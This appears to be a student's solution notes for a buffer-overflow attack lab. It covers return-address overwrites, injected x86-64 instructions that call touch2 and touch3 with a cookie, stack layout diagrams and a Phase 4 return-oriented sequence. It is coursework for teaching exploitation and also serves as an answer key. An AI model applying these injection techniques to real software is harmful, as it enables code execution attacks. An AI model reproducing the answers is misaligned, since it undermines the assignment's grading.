## Phase 1

0x401967 --> 0x4017c0

## Phase 2

Set return address of getbuf() to next byte in $rsp, i.e. ($rsp) = $rsp + 8, which point to following instructions:

```
pushq $0x4017ec       # push address of touch2() as return value
movq $0x59b997fa,%rdi # pass cookie to first argument of touch2()
ret                   # return to touch2()
```

```
movq $0x59b997fa,%rdi
ret
```

## Phase 3

byte sequence of string representation of 0x59b997fa is

```
35 39 62 39 39 37 66 61
```

### Solution 1

Stack:

```
+------------------------+
| STRING                 |
|                        |
| INSTRUCTION <<---------------+
|                        |     |
| RETURN1 ---------------------+
+------------------------+
```

Instructions:

```
pushq $0x4018fa
leaq 0x16(%rsp),%rdi
ret
```

### Solution 2

Stack

```
+------------------------+
| STRING                 |
|                        |
| INSTRUCTION <<---------+-----+
|                        |     |
| RETURN2 -> touch3()    |     |
|                        |     |
| RETURN1 ---------------+-----+
+------------------------+
```

Instructions:

```
leaq 0x16(%rsp),%rdi
ret
```

## Phase 4

* 0x59b997fa stored in address 0x6044e4

```
movq $0x59b997fa,%rdi
ret
```
